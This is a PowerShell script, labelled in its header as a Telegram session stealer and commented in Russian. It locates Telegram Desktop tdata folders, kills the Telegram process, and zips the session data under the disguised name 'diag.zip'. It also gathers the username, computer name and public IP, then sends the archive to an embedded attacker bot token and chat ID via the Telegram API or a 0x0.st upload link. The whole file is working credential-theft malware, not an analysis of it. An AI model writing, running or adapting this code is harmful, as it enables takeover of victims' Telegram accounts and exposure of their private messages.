# ============================================================
# Telegram Session Stealer + Upload to 0x0.st + Result Notif
# ============================================================

$botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"  # твой токен
$chatId   = "8620709143"                                   # твой chat_id

$result = ""
try {
    # 1. Поиск tdata
    $paths = @()
    @("$env:APPDATA\Telegram Desktop\tdata", "$env:APPDATA\Telegram Desktop Beta\tdata") | ForEach-Object {
        if (Test-Path $_) { $paths += $_ }
    }
    if ($paths.Count -eq 0) {
        $result = "❌ tdata not found"
        exit
    }

    # 2. Завершаем Telegram
    Get-Process -Name Telegram -ErrorAction SilentlyContinue | Stop-Process -Force

    # 3. Архивация
    $zip = "$env:TEMP\diag.zip"
    Compress-Archive -Path $paths -DestinationPath $zip -Force

    # 4. Сбор информации о системе
    $size = (Get-Item $zip).Length
    $user = $env:USERNAME
    $comp = $env:COMPUTERNAME
    $ip   = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content.Trim()
    $caption = "$user@$comp | IP: $ip"

    # 5. Отправка
    if ($size -gt 52428800) {
        # Большой файл → заливаем на 0x0.st и шлём ссылку
        $upload = Invoke-WebRequest -Uri 'https://0x0.st' -Method Post -Form @{ file = Get-Item $zip }
        $link = $upload.Content.Trim()
        $resp = Invoke-WebRequest -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text    = "$caption`nDownload: $link"
        }
        if ($resp.StatusCode -eq 200) {
            $result = "✅ Large file uploaded, link sent"
        } else {
            $result = "❌ Failed to send link to TG"
        }
    } else {
        # Маленький файл → отправляем напрямую
        $bytes = [System.IO.File]::ReadAllBytes($zip)
        $boundary = "---------------------------$([DateTime]::Now.Ticks.ToString('x'))"
        $multipart = @()
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="chat_id"'
        $multipart += ""
        $multipart += $chatId
        $multipart += "--$boundary"
        $multipart += 'Content-Disposition: form-data; name="document"; filename="diag.zip"'
        $multipart += 'Content-Type: application/zip'
        $multipart += ""
        $multipart += [System.Text.Encoding]::ASCII.GetString($bytes)
        $multipart += "--$boundary--"
        $headers = @{ 'Content-Type' = "multipart/form-data; boundary=$boundary" }
        $url = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId&caption=$caption"
        $resp = Invoke-WebRequest -Uri $url -Method Post -Headers $headers -Body ($multipart -join "`r`n")
        if ($resp.StatusCode -eq 200) {
            $result = "✅ Small file sent directly"
        } else {
            $result = "❌ Failed to send file to TG"
        }
    }
} catch {
    $result = "❌ Error: " + $_.Exception.Message
}

# 6. Удаляем временный архив
Remove-Item $zip -Force -ErrorAction SilentlyContinue

# 7. Отправляем уведомление о результате (если есть)
if ($result -ne "") {
    try {
        Invoke-WebRequest -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
            chat_id = $chatId
            text    = $result
        }
    } catch {}
}
